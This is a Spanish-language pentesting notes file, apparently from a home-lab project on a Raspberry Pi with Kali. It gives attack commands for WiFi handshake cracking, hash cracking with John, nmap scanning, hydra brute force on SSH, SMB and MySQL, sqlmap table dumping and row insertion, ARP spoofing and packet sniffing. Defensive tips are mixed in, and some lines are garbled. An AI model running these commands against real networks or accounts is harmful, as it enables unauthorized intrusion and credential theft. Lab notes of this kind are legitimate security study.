#=========================================================================================================================
[‚õ©Ô∏èWHITE WHALE]::
# Documentaci√≥n Sherlock                    : https://www.kali.org/tools/sherlock/?
# Documentaci√≥n no-oficial ZPHISHER         : https://www.youtube.com/watch?v=IEymiOTavEE
# Documentaci√≥n no-oficial Jonh             : https://www.youtube.com/shorts/9a8LuYSHYe0
# Documentaci√≥n no-oficial aircrack         : https://www.aircrack-ng.org/
# Documentaci√≥n no-oficial nmap             : https://nmap.org/
# Documentaci√≥n no-oficial hydra            : https://github.com/vanhauser-thc/thc-hydra
# Documentaci√≥n no-oficial sqlmap           : https://sqlmap.org/
# Documentaci√≥n no-oficial sherlock         : https://github.com/sherlock-project/sherlock
# Documentaci√≥n no-oficial gobuster         : https://github.com/OJ/gobuster
# Documentaci√≥n no-oficial zphisher         : https://github.com/htr-tech/zphisher
# Documentaci√≥n no-oficial jonh             : https://www.openwall.com/john/
# Documentaci√≥n no-oficial burp             : https://portswigger.net/burp

#=========================================================================================================================
[‚õ©Ô∏èINSTALACIONES]::
# üï∑Ô∏è esta configuraci√≥n la he realizado desde una "raspberry pi zero 2w" donde he instalado un Kali Linux
# üï∑Ô∏è de esta forma aislo una maquina de ataque del proyecto principal
# terminal
su
****
apt update && apt upgrade -y

# instalo bspwm (gestor de ventanas minimalista)
git clone https://github.com/ZLCube/AutoBspwm.git
cd AutoBspwm
chmod +x AutoInstall.sh
./AutoInstall.sh
1
****
# cuando aparezca la interface de "seleccionar una opci√≥n"
> Pink Theme

# para seleccionar el tema intro para previsualizar y alt+a para seleccionar el tema

# reglas de utilizaci√≥n::
windows + enter abre terminal 
windows + w cierra terminal
windows + d abre el buscador de aplicaciones
windows hold mover libremente la ventana
windows clic derecho reescalar libremente la ventana
windows + alt + flechas escalar ventana
windows + ctl + flechas mover ventana
control + shift + t abre pesta√±a en terminal
control shift alt t renombrar pesta√±a de terminal
control shift w cerrar pesta√±a de terminal
windows + "1,2,3,4,5,6,7,8,9,0" cambiar de escritorio
windows + shift + "1,2,3,4,5,6,7,8,9,0" cambiar de escritorio la ventana actual al escritorio seleccionado

# Los dot files los puedes modificar en las siguientes rutas.
~/.config/bspwm/bspwmrc
~/.config/polybar/
~/.config/picom/picom.conf
~/.config/sxhkd/sxhkdrc

# reinicio la m√°quina
reboot

# instalaciones 
apt update
apt upgrade -y

# creo una carpeta en el contenedor e instalo el script
mkdir /KIRIBAKO && cd /KIRIBAKO
apt install vim -y
vim script-00.sh
# i - (shift + bot√≥n derecho):
--------------------------------------------------------------------------------------
    # c√≥digo de /SCRIPTS/script-00.sh de este github
--------------------------------------------------------------------------------------

# doy permisos y hago la instalaci√≥n
chmod +x script-00.sh
./script-00.sh
source ~/.bashrc

#=========================================================================================================================
[‚õ©Ô∏èPENTESTING]::
# üë®üëãüéì he realizado una investigaci√≥n del funcionamiento de los promps que he ido utilizando, sobre mi investigaci√≥n de vulnerabilidades y como podri√°n ser los ataques
# üë®üëãüéì estos comandos son los que m√°s interesantes me han parecido


# lo primero intentar√≠a entrar a trav√©s del wifi si no tengo una interface wifi lo hago con GNS3
# pero como quiero hacer pruebas a nivel interno me salto este paso
# intento entrar al wifi
## üì∂ Wifi
    # instalo aircrack-ng
    sudo apt-get install aircrack-ng -y
    
    # identificar wifi
    iwconfig
    
    # cambio el adaptador a modo monitor 
    sudo airmon-ng start <ADAPTADOR_WIFI>
    
    # escaneo redes (Wi-Fi disponibles, BSSID/MAC, canales...)
    sudo airodump-ng wlan0mon
    
    # capturo el Handshake
    sudo airodump-ng --bssid [BSSID] -c [CANAL] -w captura wlan0mon
    
    # una vez conseguido el archivo de captura, puedo desifrar la contrase√±a
    aircrack-ng -w [ruta/diccionario.txt] -b [BSSID] captura.cap
    2


# una vez consiga un hash, hago fuerza brueta para conseguirlo en texto plano a nivel local
## üé© jonh
# instalo jonh
sudo apt install john -y

# agrego hash que me interesa a un txt
touch /KIRIBAKO/hashes.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99" > /KIRIBAKO/hashes.txt
echo "5e884898da28047151d0e56f8dc6292773603d0d6aabbddc76098d0f8a5b0c00" >> /KIRIBAKO/hashes.txt
echo "5f4dcc3b5aa765d61d8327deb882cf99
echo "5f4dcc3b5aa765d61d8327deb882cf99" >> /KIRIBAKO/hashes.txt

# descargo el dicionario
apt install wget -y
cd /KIRIBAKO
wget rockyou.txt https://github.com/brannondorsey/naive-hashcat/releases/download/data/rockyou.txt

# suponiendo que tengo un archivo hash.txt que contiene hashes de diferentes tipos
john --wordlist=/KIRIBAKO/rockyou.txt /KIRIBAKO/hashes.txt

# muestra las contrase√±as que John the Ripper ha descifrado exitosamente
john --show hashes.txt

# credenciales descubiertas
cat ~/.john/john.pot


# escaneo la red por vulnerabilidades, servicios, puertos y dispositivos
## üõú nmap 
# instalo nmap
apt install sudo
apt install nmap

# escaneo de dispositivos
nmap -sP 192.168.1.0/24

# identificaci√≥n de servicios
nmap -sV 192.168.1.1

# detectar dispositivos activos
# üï∑Ô∏è este comando me a servido para conseguir las ip para luego utilizar fuerza bruta
# üî• con un antivirus bueno deber√≠a avisarnos del intento de escaneo del equipo
sudo nmap -sP 192.168.1.0/24

# escanear puertos de una ip
sudo nmap -sS -sV 192.168.1.100

# Escaneo de Vulnerabilidades
sudo nmap --script vuln 192.168.1.100


# una vez que conozco las ip, utilizo fuerza bruta para intentar entrar a los servicios
## üêç hydra
apt install hydra
# para ssh
# üï∑Ô∏è con este comando conseguir√° las password del login (como estoy utilizando un mini-pc de bajos recursos el tiempo estimado es de casi 2 a√±os...)
# üî• las medidas son utilizar fail2ban para proteger el login y utilizar contrase√±as robustas
hydra -t 4 -l root -P /KIRIBAKO/rockyou.txt ssh://192.168.1.86
hydra -l [usuario] -P [ruta/diccionario.txt] ssh://[IP o dominio]

# para ftp
hydra -l [usuario] -P [ruta/diccionario.txt] ftp://[IP o dominio]

# para http
hydra -l [usuario] -P [ruta/diccionario.txt] [IP o dominio] http-post-form "/ruta/login:username=^USER^&password=^PASS^:Fallo en la autenticaci√≥n"

# para sql
hydra -l root -P [ruta/diccionario.txt] mysql://192.168.1.100

# para telnet 
hydra -l [usuario] -P [ruta/diccionario.txt] telnet://[IP o dominio]

# para rdp
hydra -l [usuario] -P [ruta/diccionario.txt] rdp://[IP o dominio]


# intento conseguir informaci√≥n de la base de datos
## üíâ sqlmap 
# instalo sqlmap
# git clone https://github.com/sqlmapproject/sqlmap.git
# cd sqlmap
apt install sqlmap

# üï∑Ô∏è nunca va encontrar el nombre de la base de datos ya que es una web falsa, pero el honeypot va a registrar cada petici√≥n que haga a la p√°gina
# üî• la soluci√≥n es utilizar las buenas pr√°cticas con (mysql_secure_installation) y monitorizar los registros de intrusi√≥n
# üî• adem√°s, mi script para controlar mi db me env√≠a mensajes repetitivos por cada petici√≥n
sqlmap -u "http://192.168.1.86/?id=1" -dbs --level=5 --risk=3

# con la url volnerable (intentar√° enumerar las bases de datos)
python sqlmap.py -u "http://localhost/vulnerable.php?id=1" --dbs

# pruebo a vulnerar con hydra la base de datos : üêç 
hydra -l root -P /KIRIBAKO/rockyou.txt mysql://localhost

# si encuentro el nombre de la base de datos puedo enumerar sus tablas
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos --tables

# obtengo los datos de una tabla especifica de una base de datos
sqlmap -u "http://example.com/vulnerable.php?id=1" -D nombre_base_datos -T nombre_tabla --dump

# si llego hasta aqu√≠ con el paquete de Jonh puedo descifrar luego los hashes de usuarios de la base de datos, puedo entrar al registro web con permisos de administrador
# tambi√©m puedo intentar entrar a la base de datos y crear una nueva tupla
sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-shell

# inserto una tupla acomodandola a esa db
INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');

  # otra forma de hacer lo anterior sin entrar por shell es mandar la consulta directamente
  sqlmap -u "http://example.com/vulnerable.php?id=1" --sql-query "INSERT INTO nombre_tabla (columna1, columna2) VALUES ('valor1', 'valor2');"


# Con los datos conseguidos utilizo sherlock para buscar m√°s informaci√≥n
## üîé Sherlock
# instalaci√≥n
sudo apt install git python3 python3-pip

# repositorio
cd /KIRIBAKO
git clone https://github.com/sherlock-project/sherlock.git
cd sherlock

## creo un entorno virtual 
    apt install python3-venv      # instala virtualenv
    python3 -m venv venv          # crea un entorno virtual dentro del directorio donde est√° el proyecto
    source venv/bin/activate      # Activa el entorno virtual    
    pip install -e .              # Esto instalar√≠a las dependencias especificadas en el proyecto si es compatible con pip

# analizo datos de correos de la base de datos
# üï∑Ô∏è con sherlock no solo puedes ver las paginas donde has sido registrado si no si tu correo a sido vulnerado en servicios de recopilaci√≥n
# üî• usar servicios de email temporales para registro de plataformas o accesos exteriores como la que ofrece duckduckgo o protonmail
python3 -m sherlock_project <USUARIO_O_CORREO>

# salgo del entorno virtual 
> deactivate


# üåê whatweb
# para conocer las tecnolog√≠as de una web
apt install whatweb
whatweb http://192.168.1.86/


# ü•∂ sublist3r 
# para automatizar ataques en entornos Windows
# instalaci√≥n
cd /KIRIBAKO
git clone https://github.com/Porchetta-Industries/CrackMapExec
cd CrackMapExec

## creo un entorno virtual 
    python3 -m venv venv
    source venv/bin/activate
    python setup.py install
    pip install .
    crackmapexec --help

# ataco por fuerza bruta el protocolo smb
# üêç : hydra -l <USER> -P /KIRIBAKO/rockyou.txt smb://<TARGET_IP>
# üï∑Ô∏è login exitoso en mi pc personal
# üî• deshabilitar SMBv1
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD>    
crackmapexec smb <IP_PC_PERSONAL>/24 -u <USER> -p <PASSWORD> --shares        # para comprobar los shares
smbclient //<IP_PC_PERSONAL>/Users -U <USER>                                    # en caso de poder acceder a /Users puedo entrar hasta la cocina de mi pc personal por smb:\> |

# salgo del entorno virtual 
> deactivate


# Con los datos recogidos de usuarios donde obtengo los correos realizo un phising
## üìß Zphiser
# instalaci√≥n
...


## ü¶à tshark
# instalaci√≥n
sudo apt install tshark

# para listar las interfaces
tshark -D

# üï∑Ô∏è ataque man-in-the-middle: robo de datos, contrase√±as... 
# üî• monitorizar quien est√° escuchando paquetes (arp -a)
# captura paquetes de una red
sudo tshark -i eth0 -V

# filtrar paquetes entre un equipo y el router
sudo tshark -i eth0 -f "host <IP_DESTINO> or host <IP_ROUTER>"

# ejecuto wireshark 
tshark






# Voy a utilizar arpspoof (o ettercap) para enviar paquetes ARP falsificados y caputrar el tr√°fico
## ü¶à Arpspoof && Wireshark
# instalaci√≥n 
arpspoof -i [INTERFAZ] -t [IP_VICTIMA] [IP_ROUTER]

# ver analisis 
arp

# ver tr√°fico http
http

# ver tr√°fico de v√≠ctima
ip.addr == 192.168.1.10

# ver tr√°fico entre v√≠ctima y router 
(ip.src == 192.168.1.10 && ip.dst == 192.168.1.1) || (ip.src == 192.168.1.1 && ip.dst == 192.168.1.10)















--































































# escaneo mi ususario en internet
apt install sherlock
sherlock <nombre o email>





# para encontrar la ip del router
# sudo apt install nmap net-tools curl wget aircrack-ng git -y
# apt install python3 python3-pip python3-venv -y

ip route









#===========================================================================================================================
[‚õ©Ô∏èINSTALACI√ìN ETHERNET]:

#===========================================================================================================================
[‚õ©Ô∏èINSTALACIONES]:
# Instalar paquetes de pentesting
apt install -y nmap metasploit-framework wireshark


============================================================

Nmap: Para escaneo de redes y puertos.
Metasploit: Para explotaci√≥n de vulnerabilidades

# [üõ°Ô∏èHack de red domestica]:
#    1¬∫ Esnifo la red                                             üìå nmap, Wireshark, Bettercap, Netcat 
#    2¬∫ Ataque de la red wifi                                     üìå Aircrack-ng, Reaver, Kismet
#    3¬∫ Accedo al router y consigo el user/password               üìå RouterSploit, Hydra, Medusa, Metasploit (msfconsole)
#    4¬∫ Entro en el router 
#    5¬∫ Consigo acceder alg√∫n dispositivo del router              üìå Nmap + NSE Scripts, Shodan
#    6¬∫ OPCIONAL: Creo un punto Wifi-falso (Evil Twin Attack)     üìå Setoolkit   
#    
# 
# [üõ°Ô∏èHack de web para el trabajo anterior (lebantado en una m√°quina)]:
#    1¬∫ Comprobar la inyecci√≥n SQL                                üìå sqli, SQLMap, 
#    2¬∫ Localizar p√°ginas y solicitudes HTTP                      üìå Burp Suite, Wfuzz, OWASP ZAP (Zed Attack Proxy)
#    3¬∫ Localizaci√≥n de login y fuerza bruta                      üìå Nikto, 


============================================================

[ üõ°Ô∏è H A C K D E B A J O N I V E L ]:
1. Paquetes de Red y Herramientas de An√°lisis
  libpcap: Una biblioteca que permite la captura de paquetes en redes. Es utilizada por muchas herramientas de an√°lisis de red, como Wireshark y tcpdump.
  tcpdump: Una herramienta de l√≠nea de comandos para capturar y analizar paquetes de red. Permite ver el tr√°fico en tiempo real y guardar capturas para an√°lisis posterior.
  Wireshark: Una herramienta gr√°fica de an√°lisis de protocolos de red que permite capturar y examinar el tr√°fico de red en detalle.
  Scapy: Una poderosa herramienta de manipulaci√≥n de paquetes en Python que permite crear, enviar y recibir paquetes de red. Es √∫til para pruebas de penetraci√≥n y an√°lisis de protocolos.

2. Herramientas de Escaneo y Enumeraci√≥n
  Nmap: Una herramienta de escaneo de red que permite descubrir hosts y servicios en una red, as√≠ como identificar sistemas operativos y versiones de software.
  Netcat (nc): Una herramienta vers√°til que puede ser utilizada para leer y escribir datos a trav√©s de conexiones de red utilizando TCP o UDP. Es √∫til para pruebas de conectividad y transferencia de archivos.
  Masscan: Un esc√°ner de puertos extremadamente r√°pido que puede escanear grandes rangos de direcciones IP en poco tiempo.

3. Explotaci√≥n y Ataques
  Metasploit Framework: Un marco de explotaci√≥n que incluye una amplia gama de herramientas y m√≥dulos para explotar vulnerabilidades en sistemas y aplicaciones.
  Aircrack-ng: Un conjunto de herramientas para auditar redes Wi-Fi, que incluye capacidades para capturar paquetes, crackear contrase√±as y realizar ataques de inyecci√≥n.
  Ettercap: Una herramienta para realizar ataques de "man-in-the-middle" en redes, que permite interceptar y modificar el tr√°fico entre dos hosts.

4. Herramientas de Fuerza Bruta y Cracking
  Hydra: Una herramienta de fuerza bruta que soporta m√∫ltiples protocolos y puede ser utilizada para intentar acceder a cuentas de usuario.
  John the Ripper: Un potente cracker de contrase√±as que puede utilizarse para descifrar contrase√±as a partir de hashes.
  Hashcat: Un cracker de contrase√±as que utiliza la GPU para acelerar el proceso de descifrado de contrase√±as.

5. An√°lisis de Vulnerabilidades
  Nessus: Un esc√°ner de vulnerabilidades que identifica configuraciones inseguras y vulnerabilidades en sistemas y aplicaciones.
  OpenVAS: Un esc√°ner de vulnerabilidades de c√≥digo abierto que proporciona an√°lisis de seguridad en redes y sistemas.

6. Manipulaci√≥n de Protocolos
  hping: Una herramienta de l√≠nea de comandos que permite enviar paquetes TCP/IP personalizados y realizar pruebas de red.
  Netwox: Un conjunto de herramientas de red que permite realizar diversas tareas, como escaneo, sniffing y manipulaci√≥n de paquetes.

7. Sistemas Operativos y Entornos de Hacking
  Kali Linux: Una distribuci√≥n de Linux dise√±ada espec√≠ficamente para pruebas de penetraci√≥n y seguridad inform√°tica, que incluye muchas de las herramientas mencionadas anteriormente.
  Parrot Security OS: Otra distribuci√≥n de Linux orientada a la seguridad que incluye herramientas para pruebas de penetraci√≥n y an√°lisis forense.

[ üõ°Ô∏è O T R O S M √Å S D E F I N I D O S ]:
1. Herramientas de An√°lisis Forense
  Autopsy: Una herramienta de an√°lisis forense digital que permite examinar discos duros y dispositivos de almacenamiento.
  Sleuth Kit: Un conjunto de herramientas para realizar an√°lisis forense en sistemas de archivos.

2. Herramientas de Seguridad Web
  Burp Suite: Aunque ya se mencion√≥, es importante destacar que es una de las herramientas m√°s completas para pruebas de seguridad en aplicaciones web.
  OWASP ZAP: Otra herramienta popular para pruebas de seguridad en aplicaciones web, especialmente para detectar vulnerabilidades comunes.

3. Herramientas de Escaneo de Redes
  Angry IP Scanner: Una herramienta de escaneo de redes que permite descubrir dispositivos en una red local.
  Fing: Una aplicaci√≥n para escanear redes y descubrir dispositivos conectados.

4. Herramientas de Cracking de Contrase√±as
  Cain and Abel: Una herramienta para recuperar contrase√±as de Windows que incluye capacidades de sniffing y cracking.
  L0phtCrack: Una herramienta para auditar contrase√±as de Windows.

5. Herramientas de Ingenier√≠a Social
  Social-Engineer Toolkit (SET): Una herramienta dise√±ada para realizar ataques de ingenier√≠a social, como phishing y ataques de suplantaci√≥n.

6. Herramientas de Automatizaci√≥n
  Puppet/Chef/Ansible: Aunque son herramientas de gesti√≥n de configuraci√≥n, pueden ser utilizadas para automatizar la configuraci√≥n de entornos de pruebas de penetraci√≥n.

7. Herramientas de Seguridad de IoT
  IoT Inspector: Una herramienta para analizar la seguridad de dispositivos IoT y sus comunicaciones.

8. Herramientas de An√°lisis de Malware
  Cuckoo Sandbox: Una herramienta de an√°lisis de malware que permite ejecutar y analizar archivos sospechosos en un entorno controlado.

9. Frameworks de Pruebas de Penetraci√≥n
  Pwnage: Un marco de pruebas de penetraci√≥n que incluye herramientas para realizar diversas pruebas de seguridad.

10. Herramientas de Sniffing y Spoofing
  dsniff: Un conjunto de herramientas para realizar ataques de sniffing y spoofing en redes.
  Bettercap: Una herramienta de ataque de red que permite realizar ataques de "man-in-the-middle" y sniffing.













----------------------------------------












Herramientas a instalar
Nmap: Herramienta de escaneo de redes.
bash
-
sudo apt update
sudo apt install nmap
Metasploit Framework: Plataforma para desarrollar y ejecutar exploits.
-

-
sudo apt install metasploit-framework
Wireshark: Herramienta de an√°lisis de tr√°fico de red (puedes usar tshark en terminal).
-

-
sudo apt install tshark
Burp Suite: Herramienta para pruebas de seguridad en aplicaciones web (puedes usar la versi√≥n comunitaria).
-

-
sudo apt install burpsuite
Nikto: Esc√°ner de vulnerabilidades para servidores web.
-

-
sudo apt install nikto
John the Ripper: Herramienta para romper contrase√±as.
-

-
sudo apt install john
Aircrack-ng: Suite de herramientas para auditor√≠a de redes Wi-Fi.
-

-
sudo apt install aircrack-ng
Gobuster: Herramienta para enumerar directorios y archivos en servidores web.
-

-
sudo apt install gobuster
Hydra: Herramienta para ataques de fuerza bruta.
-

-
sudo apt install hydra
C√≥mo utilizarlas
Nmap: Puedes usar Nmap para escanear redes y descubrir hosts activos.
-

-
nmap -sP 192.168.1.0/24
Metasploit: Inicia Metasploit y busca exploits para vulnerabilidades espec√≠ficas.
-

-
msfconsole
Tshark: Captura tr√°fico de red en tiempo real.
-

-
sudo tshark -i eth0
Nikto: Escanea un servidor web en busca de vulnerabilidades.
-

-
nikto -h http://example.com
John the Ripper: Usa John para intentar romper un archivo de contrase√±as.
-

-
john --wordlist=/path/to/wordlist.txt /path/to/passwordfile
Aircrack-ng: Captura paquetes y crackea contrase√±as de redes Wi-Fi.
-

-
airodump-ng wlan0
Gobuster: Busca directorios y archivos ocultos en un servidor web.
-

-
gobuster dir -u http://example.com -w /path/to/wordlist.txt
Hydra: Realiza un ataque de fuerza bruta a un servicio.
-

-
hydra -l admin -P /path/to/passwordlist.txt ftp://example.com
Consideraciones
Permisos: Aseg√∫rate de tener permiso para realizar pruebas de penetraci√≥n en las redes y sistemas que escaneas.
Actualizaciones: Mant√©n tu sistema y herramientas actualizadas.
Documentaci√≥n: Familiar√≠zate con la documentaci√≥n de cada herramienta para aprovechar al m√°ximo sus capacidades.
